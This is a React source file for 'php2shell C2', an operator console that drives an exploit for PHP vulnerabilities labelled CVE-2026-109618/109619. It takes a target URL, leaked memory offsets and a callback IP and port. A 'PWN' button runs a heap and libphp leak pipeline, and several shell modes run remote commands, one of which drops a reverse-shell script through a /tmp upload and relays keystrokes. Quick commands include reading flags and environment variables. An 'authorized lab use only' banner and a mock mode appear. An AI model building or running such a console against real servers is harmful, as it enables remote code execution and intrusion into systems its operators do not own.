"use client";

import { useCallback, useEffect, useMemo, useRef, useState } from "react";
import { toast } from "@/hooks/use-toast";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Badge } from "@/components/ui/badge";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Switch } from "@/components/ui/switch";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import {
  Collapsible,
  CollapsibleContent,
  CollapsibleTrigger,
} from "@/components/ui/collapsible";
import {
  Tooltip,
  TooltipContent,
  TooltipProvider,
  TooltipTrigger,
} from "@/components/ui/tooltip";
import {
  ChevronDown,
  Crosshair,
  Radio,
  ShieldAlert,
  TerminalSquare,
  Zap,
} from "lucide-react";
import P2sTerminal, { type TerminalHandle } from "./terminal";

/* ---------------- types ---------------- */

interface LogLine {
  ts: number;
  level: string;
  msg: string;
}

interface Snapshot {
  config: unknown;
  agentRunning: boolean;
  state: string;
  mode: string | null;
  modes: Record<string, boolean>;
  leaks: Record<string, string | null>;
  stages: Record<string, { status: string; detail?: string }>;
  shellStatus: { status: string; detail?: string } | null;
}

const MODE_INFO: Record<string, { label: string; limit: string; hint: string }> = {
  resp: {
    label: "resp",
    limit: "max 14 bytes",
    hint: "output captured from the exploit response body - fastest",
  },
  fetch: {
    label: "fetch",
    limit: "max 12 bytes",
    hint: "CMD>o written to webroot, fetched over HTTP",
  },
  tail: {
    label: "tail",
    limit: "any length, no |;&<>()`'\"",
    hint: "held-open `tail -F c|sh` worker; ~10-40s per 4-6 char chunk",
  },
  tmpdrop: {
    label: "tmpdrop",
    limit: "full interactive",
    hint: "drops a reverse-shell script via surviving /tmp upload; true terminal",
  },
};

const QUICK_CMDS = ["id", "whoami", "uname -a", "ls -la", "cat /flag*", "env"];

/* ---------------- helpers ---------------- */

function hex(v: string | null | undefined): string {
  if (!v) return "-";
  return v;
}

function logColor(level: string): string {
  switch (level) {
    case "warn":
      return "text-amber-400";
    case "agent":
    case "agent-err":
      return "text-zinc-500";
    case "raw":
      return "text-emerald-300";
    default:
      return "text-zinc-400";
  }
}

function b64ToUtf8(b64: string): string {
  try {
    return decodeURIComponent(escape(atob(b64)));
  } catch {
    try {
      return atob(b64);
    } catch {
      return "";
    }
  }
}

function stageColor(status: string): string {
  switch (status) {
    case "done":
      return "bg-emerald-500/15 text-emerald-400 border-emerald-500/40";
    case "running":
      return "bg-amber-500/15 text-amber-400 border-amber-500/40 animate-pulse";
    case "failed":
      return "bg-red-500/15 text-red-400 border-red-500/40";
    default:
      return "bg-zinc-800 text-zinc-500 border-zinc-700";
  }
}

function stateColor(state: string): string {
  switch (state) {
    case "ready":
      return "bg-emerald-500/15 text-emerald-400 border-emerald-500/40";
    case "shell":
      return "bg-emerald-500/25 text-emerald-300 border-emerald-400/60 animate-pulse";
    case "error":
      return "bg-red-500/15 text-red-400 border-red-500/40";
    default:
      return "bg-zinc-800 text-zinc-400 border-zinc-700";
  }
}

/* ---------------- main component ---------------- */

export default function Console() {
  const [cfg, setCfg] = useState({
    url: "",
    profile: "bookworm",
    hugeMb: 12,
    timeout: 30,
    retries: 3,
    zifOffset: "",
    dtorOffset: "",
    htdataOffset: "",
    callbackIp: "",
    callbackPort: 4444,
    mock: false,
  });
  const [snap, setSnap] = useState<Snapshot>({
    config: null,
    agentRunning: false,
    state: "idle",
    mode: null,
    modes: {},
    leaks: {},
    stages: {},
    shellStatus: null,
  });
  const [logs, setLogs] = useState<LogLine[]>([]);
  const [busy, setBusy] = useState({ connect: false, pwn: false, shell: false });
  const [shellMode, setShellMode] = useState("auto");
  const [rawCmd, setRawCmd] = useState("id>/out/p1");
  const [rawFetch, setRawFetch] = useState("");

  const termRef = useRef<TerminalHandle>(null);
  const logBoxRef = useRef<HTMLDivElement>(null);
  const esRef = useRef<EventSource | null>(null);
  const snapRef = useRef(snap);
  snapRef.current = snap;
  const modeRef = useRef(shellMode);
  modeRef.current = shellMode;

  const appendLog = useCallback((line: LogLine) => {
    setLogs((prev) => {
      const next = [...prev, line];
      return next.length > 1500 ? next.slice(next.length - 1500) : next;
    });
  }, []);

  /* ---------- SSE wiring ---------- */
  useEffect(() => {
    const es = new EventSource("/api/events?logs=1");
    esRef.current = es;
    es.onmessage = (ev) => {
      try {
        const msg = JSON.parse(ev.data);
        switch (msg.type) {
          case "hello":
            setSnap(msg.snapshot as Snapshot);
            break;
          case "log":
            appendLog({ ts: msg.ts, level: msg.level, msg: msg.msg });
            break;
          case "stage":
            setSnap((s) => ({
              ...s,
              stages: { ...s.stages, [msg.stage]: { status: msg.status, detail: msg.detail } },
            }));
            break;
          case "state":
            setSnap((s) => ({
              ...s,
              state: msg.state,
              mode: msg.mode,
              modes: msg.modes ?? s.modes,
              leaks: msg.leaks ?? s.leaks,
            }));
            break;
          case "shell_status":
            setSnap((s) => ({
              ...s,
              shellStatus: { status: msg.status, detail: msg.detail },
            }));
            if (msg.status === "connected")
              termRef.current?.writeln("\x1b[1;32m[+] reverse shell connected - raw mode\x1b[0m");
            if (msg.status === "closed")
              termRef.current?.writeln("\x1b[31m[-] shell channel closed\x1b[0m");
            if (msg.status === "chunk")
              termRef.current?.writeln(`\x1b[90m[*] ${msg.detail}\x1b[0m`);
            break;
          case "shell_data":
            termRef.current?.write(b64ToUtf8(msg.data));
            break;
          case "result": {
            if (!msg.ok) {
              const err = msg.error ?? "unknown error";
              appendLog({ ts: Date.now(), level: "warn", msg: `[-] ${err}` });
              if (msg.data?.toString().includes("HEAP_LEAK") === false)
                termRef.current?.writeln(`\x1b[31m[-] ${err}\x1b[0m`);
            } else if (msg.data && typeof msg.data === "object") {
              const d = msg.data as Record<string, unknown>;
              if (d.error === "HEAP_LEAK_FAILED" || d.error === "LIBPHP_LEAK_FAILED") {
                termRef.current?.writeln(`\x1b[31m[-] ${d.error}\x1b[0m`);
                toast({
                  title: "Exploit stage failed",
                  description: String(d.error),
                  variant: "destructive",
                });
              }
            }
            setBusy((b) => ({ ...b, pwn: false, shell: false }));
            break;
          }
        }
      } catch {
        /* malformed event */
      }
    };
    return () => {
      es.close();
    };
  }, [appendLog]);

  useEffect(() => {
    logBoxRef.current?.scrollTo({ top: logBoxRef.current.scrollHeight });
  }, [logs]);

  /* ---------- actions ---------- */

  const connect = async () => {
    setBusy((b) => ({ ...b, connect: true }));
    try {
      const res = await fetch("/api/session", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(cfg),
      });
      const data = await res.json();
      if (!res.ok) throw new Error(data.error ?? "connect failed");
      setSnap(data.snapshot as Snapshot);
      appendLog({ ts: Date.now(), level: "info", msg: "[+] agent connected and configured" });
      toast({ title: "Target locked in", description: cfg.mock ? "mock agent" : cfg.url });
      termRef.current?.writeln(
        `\x1b[1;34m[*] target: ${cfg.mock ? "MOCK" : cfg.url} (profile: ${cfg.profile})\x1b[0m`,
      );
    } catch (e) {
      toast({
        title: "Connect failed",
        description: e instanceof Error ? e.message : String(e),
        variant: "destructive",
      });
    } finally {
      setBusy((b) => ({ ...b, connect: false }));
    }
  };

  const action = async (op: string, params?: Record<string, unknown>) => {
    const res = await fetch("/api/action", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ op, params }),
    });
    const data = await res.json();
    if (!res.ok) {
      toast({
        title: `Cannot ${op}`,
        description: data.error ?? "request failed",
        variant: "destructive",
      });
      return null;
    }
    return data;
  };

  const pwn = async () => {
    setBusy((b) => ({ ...b, pwn: true }));
    termRef.current?.writeln("\x1b[1;33m[*] exploit pipeline started - watch the log\x1b[0m");
    await action("pwn");
  };

  const openShell = async (mode: string) => {
    setBusy((b) => ({ ...b, shell: true }));
    await action("open_shell", {
      mode: mode === "auto" ? null : mode,
      callback_port: cfg.callbackPort,
    });
  };

  const killShell = async () => {
    await action("kill_shell");
    termRef.current?.writeln("\x1b[90m[*] shell channel torn down\x1b[0m");
  };

  const execCmd = useCallback(
    async (cmd: string) => {
      const trimmed = cmd.trim();
      if (!trimmed) return;
      const mode = modeRef.current === "auto" ? null : modeRef.current;
      // client-side budget hints
      if (mode === "resp" && trimmed.length > 14) {
        termRef.current?.writeln("\x1b[33m[!] resp mode: command > 14 bytes; it will be rejected\x1b[0m");
      } else if (mode === "fetch" && trimmed.length > 12) {
        termRef.current?.writeln("\x1b[33m[!] fetch mode: command > 12 bytes (CMD>o); it will be rejected\x1b[0m");
      } else if (mode === "tail" && /[|;&<>()`'"\\]/.test(trimmed)) {
        termRef.current?.writeln(
          "\x1b[33m[!] tail mode: |;&<>()`'\\\" are not transportable; use fetch/tmpdrop for those\x1b[0m",
        );
      }
      termRef.current?.writeln(`\x1b[90m[*] queuing: ${trimmed}\x1b[0m`);
      try {
        const res = await fetch("/api/shell", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ cmd: trimmed, mode }),
        });
        const data = await res.json();
        if (!res.ok) {
          termRef.current?.writeln(`\x1b[31m[-] ${data.error ?? "rejected"}\x1b[0m`);
        }
      } catch {
        termRef.current?.writeln("\x1b[31m[-] network error while sending command\x1b[0m");
      }
    },
    [],
  );

  const onTermData = useCallback((data: string) => {
    // raw keystrokes are only forwarded while the tmpdrop reverse shell is live
    const st = snapRef.current;
    const rawMode = st.mode === "tmpdrop" && st.shellStatus?.status === "connected";
    if (!rawMode) return;
    fetch("/api/shell", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ input: data }),
    }).catch(() => undefined);
  }, []);

  // line-mode submit comes from the terminal component's Enter handling
  const handleLine = useCallback(
    (line: string) => {
      if (!line.trim()) return;
      void execCmd(line);
    },
    [execCmd],
  );

  const rawRun = async () => {
    termRef.current?.writeln(`\x1b[1;33m[*] raw PoC run: ${rawCmd}\x1b[0m`);
    const res = await fetch("/api/raw", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ cmd: rawCmd, fetch: rawFetch }),
    });
    const data = await res.json();
    if (!res.ok) {
      toast({ title: "Raw run rejected", description: data.error, variant: "destructive" });
    }
  };

  const ready = snap.state === "ready" || snap.state === "shell";
  const effectiveMode = useMemo(() => {
    if (shellMode !== "auto") return shellMode;
    return snap.mode ?? "resp";
  }, [shellMode, snap.mode]);
  const rawTerminal =
    snap.mode === "tmpdrop" && snap.shellStatus?.status === "connected";

  const stageNames = ["rotate", "stage1", "stage2", "probe"] as const;

  return (
    <TooltipProvider delayDuration={200}>
      <div className="min-h-screen bg-zinc-950 text-zinc-200 flex flex-col">
        {/* header */}
        <header className="border-b border-zinc-800 bg-zinc-900/60 backdrop-blur sticky top-0 z-20">
          <div className="max-w-7xl mx-auto px-4 py-3 flex flex-wrap items-center gap-3">
            <TerminalSquare className="h-6 w-6 text-emerald-400" />
            <h1 className="text-lg font-bold tracking-tight">
              php2shell<span className="text-emerald-400"> C2</span>
            </h1>
            <Badge variant="outline" className="font-mono text-[10px] border-zinc-700 text-zinc-400">
              CVE-2026-109618 / CVE-2026-109619
            </Badge>
            <Badge className="bg-emerald-500/15 text-emerald-400 border border-emerald-500/40 text-[10px] gap-1">
              <ShieldAlert className="h-3 w-3" /> authorized lab use only
            </Badge>
            <div className="ml-auto flex items-center gap-2">
              <Badge variant="outline" className={`font-mono text-[10px] border ${stateColor(snap.state)}`}>
                {snap.state}
              </Badge>
              {snap.mode && (
                <Badge variant="outline" className="font-mono text-[10px] border-zinc-700 text-zinc-300">
                  mode: {snap.mode}
                </Badge>
              )}
            </div>
          </div>
        </header>

        {/* main */}
        <main className="flex-1 w-full max-w-7xl mx-auto px-4 py-6 grid grid-cols-1 lg:grid-cols-[400px_1fr] gap-6 items-start">
          {/* left column */}
          <div className="flex flex-col gap-6 min-w-0">
            {/* target card */}
            <Card className="bg-zinc-900/60 border-zinc-800">
              <CardHeader className="pb-3">
                <CardTitle className="text-sm flex items-center gap-2">
                  <Crosshair className="h-4 w-4 text-emerald-400" /> Target
                </CardTitle>
              </CardHeader>
              <CardContent className="flex flex-col gap-4">
                <div className="grid gap-2">
                  <Label htmlFor="url" className="text-xs text-zinc-400">
                    Target PHP page (session-enabled)
                  </Label>
                  <Input
                    id="url"
                    placeholder="http://10.10.x.x:8080/index.php"
                    value={cfg.url}
                    onChange={(e) => setCfg({ ...cfg, url: e.target.value })}
                    className="bg-zinc-950 border-zinc-800 font-mono text-xs"
                  />
                </div>
                <div className="grid grid-cols-2 gap-3">
                  <div className="grid gap-2">
                    <Label className="text-xs text-zinc-400">Profile</Label>
                    <Select
                      value={cfg.profile}
                      onValueChange={(v) => setCfg({ ...cfg, profile: v })}
                    >
                      <SelectTrigger className="bg-zinc-950 border-zinc-800 text-xs">
                        <SelectValue />
                      </SelectTrigger>
                      <SelectContent className="bg-zinc-950 border-zinc-800">
                        <SelectItem value="bookworm">bookworm (php:8.4.26-apache)</SelectItem>
                        <SelectItem value="lab">lab (Apache 2.4.68)</SelectItem>
                      </SelectContent>
                    </Select>
                  </div>
                  <div className="grid gap-2">
                    <Label className="text-xs text-zinc-400">Callback port</Label>
                    <Input
                      type="number"
                      value={cfg.callbackPort}
                      onChange={(e) =>
                        setCfg({ ...cfg, callbackPort: Number(e.target.value) || 4444 })
                      }
                      className="bg-zinc-950 border-zinc-800 font-mono text-xs"
                    />
                  </div>
                </div>

                <Collapsible>
                  <CollapsibleTrigger className="flex items-center gap-1 text-xs text-zinc-500 hover:text-zinc-300">
                    <ChevronDown className="h-3 w-3" /> advanced (offsets, OOM size, mock)
                  </CollapsibleTrigger>
                  <CollapsibleContent className="pt-3 grid gap-3">
                    <div className="grid grid-cols-3 gap-2">
                      <div className="grid gap-1">
                        <Label className="text-[10px] text-zinc-500">zif_system</Label>
                        <Input
                          placeholder="0x43a870"
                          value={cfg.zifOffset}
                          onChange={(e) => setCfg({ ...cfg, zifOffset: e.target.value })}
                          className="bg-zinc-950 border-zinc-800 font-mono text-[11px] h-8"
                        />
                      </div>
                      <div className="grid gap-1">
                        <Label className="text-[10px] text-zinc-500">zval_ptr_dtor</Label>
                        <Input
                          placeholder="0x613c50"
                          value={cfg.dtorOffset}
                          onChange={(e) => setCfg({ ...cfg, dtorOffset: e.target.value })}
                          className="bg-zinc-950 border-zinc-800 font-mono text-[11px] h-8"
                        />
                      </div>
                      <div className="grid gap-1">
                        <Label className="text-[10px] text-zinc-500">htdata</Label>
                        <Input
                          placeholder="auto"
                          value={cfg.htdataOffset}
                          onChange={(e) => setCfg({ ...cfg, htdataOffset: e.target.value })}
                          className="bg-zinc-950 border-zinc-800 font-mono text-[11px] h-8"
                        />
                      </div>
                    </div>
                    <div className="grid grid-cols-2 gap-2">
                      <div className="grid gap-1">
                        <Label className="text-[10px] text-zinc-500">huge_mb (&gt; memory_limit)</Label>
                        <Input
                          type="number"
                          value={cfg.hugeMb}
                          onChange={(e) => setCfg({ ...cfg, hugeMb: Number(e.target.value) || 12 })}
                          className="bg-zinc-950 border-zinc-800 font-mono text-[11px] h-8"
                        />
                      </div>
                      <div className="grid gap-1">
                        <Label className="text-[10px] text-zinc-500">callback IP (empty = auto)</Label>
                        <Input
                          placeholder="10.10.x.x"
                          value={cfg.callbackIp}
                          onChange={(e) => setCfg({ ...cfg, callbackIp: e.target.value })}
                          className="bg-zinc-950 border-zinc-800 font-mono text-[11px] h-8"
                        />
                      </div>
                    </div>
                    <div className="flex items-center gap-2">
                      <Switch
                        id="mock"
                        checked={cfg.mock}
                        onCheckedChange={(v) => setCfg({ ...cfg, mock: v })}
                      />
                      <Label htmlFor="mock" className="text-xs text-zinc-400">
                        Mock mode (no real target; demo pipeline)
                      </Label>
                    </div>
                  </CollapsibleContent>
                </Collapsible>

                <div className="flex gap-2">
                  <Button
                    onClick={connect}
                    disabled={busy.connect}
                    className="flex-1 bg-emerald-600 hover:bg-emerald-500 text-zinc-950 font-semibold"
                  >
                    {busy.connect ? "connecting..." : "Connect"}
                  </Button>
                  <Tooltip>
                    <TooltipTrigger asChild>
                      <Button
                        onClick={pwn}
                        disabled={busy.pwn || !snap.agentRunning}
                        variant="outline"
                        className="flex-1 border-emerald-600/50 text-emerald-400 hover:bg-emerald-500/10 hover:text-emerald-300 font-semibold"
                      >
                        <Zap className="h-4 w-4 mr-1" />
                        {busy.pwn ? "exploiting..." : "PWN"}
                      </Button>
                    </TooltipTrigger>
                    <TooltipContent className="bg-zinc-900 border-zinc-700 text-zinc-300 text-xs">
                      stage 0-2: rotate workers, leak chunk + libphp, auto-probe output channel
                    </TooltipContent>
                  </Tooltip>
                </div>
              </CardContent>
            </Card>

            {/* pipeline card */}
            <Card className="bg-zinc-900/60 border-zinc-800">
              <CardHeader className="pb-3">
                <CardTitle className="text-sm flex items-center gap-2">
                  <Radio className="h-4 w-4 text-emerald-400" /> Pipeline
                </CardTitle>
              </CardHeader>
              <CardContent className="grid gap-3">
                <div className="flex flex-wrap gap-2">
                  {stageNames.map((st) => {
                    const info = snap.stages[st];
                    return (
                      <Badge
                        key={st}
                        variant="outline"
                        className={`font-mono text-[10px] border ${stageColor(info?.status ?? "")}`}
                        title={info?.detail ?? ""}
                      >
                        {st}: {info?.status ?? "idle"}
                      </Badge>
                    );
                  })}
                </div>
                <div className="text-[11px] font-mono text-zinc-500 grid gap-1">
                  <div>
                    chunk <span className="text-emerald-400">{hex(snap.leaks.chunk)}</span>
                    {"  "}libphp <span className="text-emerald-400">{hex(snap.leaks.libphp)}</span>
                  </div>
                  <div>
                    htdata <span className="text-emerald-400">{hex(snap.leaks.htdata)}</span>
                    {"  "}zif <span className="text-emerald-400">{hex(snap.leaks.zif)}</span>
                  </div>
                </div>
                <div
                  ref={logBoxRef}
                  className="h-64 overflow-y-auto rounded-md border border-zinc-800 bg-zinc-950 p-2 font-mono text-[10.5px] leading-relaxed"
                >
                  {logs.length === 0 && (
                    <div className="text-zinc-600">agent log appears here...</div>
                  )}
                  {logs.map((l, i) => (
                    <div key={`${l.ts}-${i}`} className={logColor(l.level)}>
                      {l.msg}
                    </div>
                  ))}
                </div>
              </CardContent>
            </Card>

            {/* raw PoC card */}
            <Card className="bg-zinc-900/60 border-zinc-800">
              <CardHeader className="pb-3">
                <CardTitle className="text-sm">Raw PoC runner (exploit.py CLI)</CardTitle>
              </CardHeader>
              <CardContent className="grid gap-3">
                <div className="grid gap-2">
                  <Input
                    value={rawCmd}
                    onChange={(e) => setRawCmd(e.target.value)}
                    placeholder="id>/out/p1"
                    className="bg-zinc-950 border-zinc-800 font-mono text-xs"
                  />
                  <Input
                    value={rawFetch}
                    onChange={(e) => setRawFetch(e.target.value)}
                    placeholder="--fetch path (optional, e.g. /p1.txt)"
                    className="bg-zinc-950 border-zinc-800 font-mono text-xs"
                  />
                  <Button
                    variant="outline"
                    size="sm"
                    onClick={rawRun}
                    className="border-zinc-700 text-zinc-300 hover:bg-zinc-800"
                  >
                    run exploit.py
                  </Button>
                </div>
              </CardContent>
            </Card>
          </div>

          {/* right column: shell */}
          <Card className="bg-zinc-900/60 border-zinc-800 flex flex-col min-w-0">
            <CardHeader className="pb-3 flex-row items-center justify-between space-y-0">
              <CardTitle className="text-sm flex items-center gap-2">
                <TerminalSquare className="h-4 w-4 text-emerald-400" /> Shell
              </CardTitle>
              <div className="flex items-center gap-2">
                <Select value={shellMode} onValueChange={setShellMode}>
                  <SelectTrigger className="w-[130px] bg-zinc-950 border-zinc-800 text-xs">
                    <SelectValue />
                  </SelectTrigger>
                  <SelectContent className="bg-zinc-950 border-zinc-800">
                    <SelectItem value="auto">auto (probed)</SelectItem>
                    <SelectItem value="resp">resp (fast, 14B)</SelectItem>
                    <SelectItem value="fetch">fetch (12B)</SelectItem>
                    <SelectItem value="tail">tail (long cmds)</SelectItem>
                    <SelectItem value="tmpdrop">tmpdrop (revshell)</SelectItem>
                  </SelectContent>
                </Select>
                <Button
                  size="sm"
                  onClick={() => openShell(shellMode)}
                  disabled={!ready || busy.shell}
                  className="bg-emerald-600 hover:bg-emerald-500 text-zinc-950 font-semibold"
                >
                  open shell
                </Button>
                <Button
                  size="sm"
                  variant="outline"
                  onClick={killShell}
                  disabled={!snap.mode}
                  className="border-zinc-700 text-zinc-400 hover:bg-zinc-800"
                >
                  close
                </Button>
              </div>
            </CardHeader>
            <CardContent className="grid gap-3">
              <div className="text-[11px] text-zinc-500 font-mono">
                {MODE_INFO[effectiveMode]
                  ? `${MODE_INFO[effectiveMode].label} - ${MODE_INFO[effectiveMode].limit} - ${MODE_INFO[effectiveMode].hint}`
                  : "select a mode and open the shell"}
                {snap.shellStatus?.detail ? ` | ${snap.shellStatus.detail}` : ""}
              </div>
              <div className="flex flex-wrap gap-2">
                {QUICK_CMDS.map((c) => (
                  <button
                    key={c}
                    onClick={() => execCmd(c)}
                    disabled={!ready}
                    className="px-2 py-1 rounded border border-zinc-800 bg-zinc-950 font-mono text-[10px] text-zinc-400 hover:border-emerald-600/50 hover:text-emerald-400 transition-colors disabled:opacity-40"
                  >
                    {c}
                  </button>
                ))}
              </div>
              <div className="rounded-md border border-zinc-800 overflow-hidden">
                <P2sTerminal
                  ref={termRef}
                  onData={onTermData}
                  onLine={handleLine}
                  rawMode={Boolean(rawTerminal)}
                  className="h-[520px] w-full"
                />
              </div>
              <div className="text-[10px] text-zinc-600 font-mono">
                line mode: type + Enter (resp/fetch/tail) | raw keystrokes once the
                tmpdrop reverse shell connects | per-command latency ~10-60s except
                revshell
              </div>
            </CardContent>
          </Card>
        </main>

        {/* footer */}
        <footer className="border-t border-zinc-800 bg-zinc-900/60 mt-auto">
          <div className="max-w-7xl mx-auto px-4 py-3 text-[11px] text-zinc-500 flex flex-wrap gap-x-4 gap-y-1 justify-between">
            <span>
              Use only against systems you are explicitly authorized to test (e.g.
              your TryHackMe lab). CVE-2026-109618/109619 - fixed in PHP 8.2.35 /
              8.3.36 / 8.4.27 / 8.5.12.
            </span>
            <span className="font-mono">
              engine: exploit.py + agent.py |{" "}
              {snap.agentRunning ? "agent running" : "agent idle"}
            </span>
          </div>
        </footer>
      </div>
    </TooltipProvider>
  );
}
